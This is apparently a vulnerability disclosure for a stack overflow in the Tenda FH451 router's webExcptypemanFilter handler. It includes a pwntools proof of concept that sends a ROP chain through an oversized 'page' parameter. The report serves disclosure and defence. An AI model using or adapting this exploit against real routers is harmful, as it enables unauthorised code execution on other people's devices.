# Shenzhen Jixiang Tengda Technology Co., Ltd. FH451 has a Remote Code Execution vulnerability

**Vulnerability URL**: [http://192.168.100.157:80/goform/webExcptypemanFilter](http://192.168.100.157:80/goform/webExcptypemanFilter)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/101629](https://www.tenda.com.cn/material/show/101629)

## Vulnerability Analysis
The vulnerability occurs in the `webExcptypemanFilter` function.
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451.png)
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_2.png)

The program retrieves the user input parameter `page` but does not perform any size check. When the parameter value is excessively large, it causes a stack overflow, which can lead to a program crash or potential exploitation.  
Cross-referenced location: from the `fromwebExcptypemanFilter` function, routed to `webExcptypemanFilter`, at line 99.

![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_3.png)
Further cross-referenced to the `sub_64EAC` function, with attention to lines 44 and 47.
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_4.png)
It can be determined that the vulnerability occurs at the page path `goform/webExcptypemanFilter`.

```python
import requests
from pwn import *

addr = 0x0064920
libc = ELF("./lib/libc.so.0")
system_offset = libc.symbols["system"]
base = 0xf6636000
system_addr = base + system_offset
cmd = b"RCERCERCERCERCERCERCERCE\nRCERCERCERCERCERCERCE\x00"
puts = base + libc.sym['puts']

move_r0 = base + 0x00040cb8
r3_pop = base + 0x00018298

url = "http://192.168.100.166:83/goform/webExcptypemanFilter"
payload = {
    'page': cyclic(97) + p32(r3_pop) + p32(puts) + p32(move_r0) + cmd
}

res = requests.post(url=url, data=payload)
```

# reproduce
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_5.png)
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_6.png)
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_7.png)
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_8.png)
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_9.png)
![Image 1](https://github.com/xubeining/Cve_report/blob/main/FH451_10.png)
